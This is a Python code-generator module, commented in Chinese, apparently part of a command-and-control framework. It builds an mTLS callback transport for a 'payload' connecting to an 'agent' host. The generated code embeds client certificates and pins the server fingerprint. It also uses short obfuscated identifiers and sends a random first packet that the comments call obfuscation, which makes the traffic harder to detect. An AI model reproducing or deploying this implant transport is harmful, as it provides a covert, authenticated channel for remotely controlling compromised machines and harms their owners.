"""
@module: transport_mtls
@desc: 生成 mTLS 传输实现代码(双向证书认证 + CA 链校验 + server 证书指纹 pin; 载荷连 agent_mtls 前置)
@params: host port key_hex client_cert client_key ca_cert server_fingerprint
"""
MODULE = {
    "desc": "生成 mTLS 传输实现代码(双向认证)",
    "params": [
        ("host", "必填，agent 地址"),
        ("port", "必填，agent mTLS 监听端口"),
        ("key_hex", "必填，agent_key"),
        ("client_cert", "必填，载荷客户端证书 PEM 路径(agent_mtls 生成)"),
        ("client_key", "必填，载荷客户端私钥 PEM 路径"),
        ("ca_cert", "必填，agent CA 证书 PEM 路径(链校验信任锚)"),
        ("server_fingerprint", "必填，agent server 证书 sha256 指纹 pin"),
    ],
}


def run(host, port, key_hex, client_cert, client_key, ca_cert,
        server_fingerprint):
    """生成 _nT() 实现：mTLS 客户端（携带客户端证书 + CA 链校验 + server 证书 pin）。"""
    host = str(host)
    port = int(port)
    server_fingerprint = str(server_fingerprint).strip().lower()

    with open(client_cert, "r", encoding="utf-8") as f:
        c_cert = f.read()
    with open(client_key, "r", encoding="utf-8") as f:
        c_key = f.read()
    with open(ca_cert, "r", encoding="utf-8") as f:
        ca_pem = f.read()

    code = f'''\
import ssl as _sl, hashlib as _hl, socket as _sa, os as _os
_CC={c_cert!r}
_CKEY={c_key!r}
_CAPEM={ca_pem!r}
def _nT():
    import tempfile as _t
    cf=_t.NamedTemporaryFile(delete=False,suffix=".pem");cf.write(_CC.encode());cf.close()
    kf=_t.NamedTemporaryFile(delete=False,suffix=".pem");kf.write(_CKEY.encode());kf.close()
    try:
        s=_sa.socket()
        s.settimeout(30)
        s.connect(({host!r}, {port}))
        ctx=_sl.SSLContext(_sl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname=False
        ctx.verify_mode=_sl.CERT_REQUIRED
        ctx.load_verify_locations(cadata=_CAPEM)   # CA 信任锚(agent 签发)
        ctx.load_cert_chain(cf.name,kf.name)       # 客户端证书(agent_mtls 签发, CA 校验)
        t=ctx.wrap_socket(s)
    finally:
        _os.unlink(cf.name);_os.unlink(kf.name)
    der=t.getpeercert(binary_form=True)
    if _hl.sha256(der).hexdigest() != {server_fingerprint!r}:
        t.close()
        raise ConnectionError("mtls server fingerprint mismatch")
    t.sendall(_os.urandom(256))  # 混淆: 首包随机前缀(agent a2s 吞掉)
    return t
'''
    compile(code, "<mtls>", "exec")  # 生成即校验
    return code


if __name__ == "__main__":
    print("usage: transport_mtls <host> <port> <key_hex> <client_cert> "
          "<client_key> <ca_cert> <server_fingerprint>")
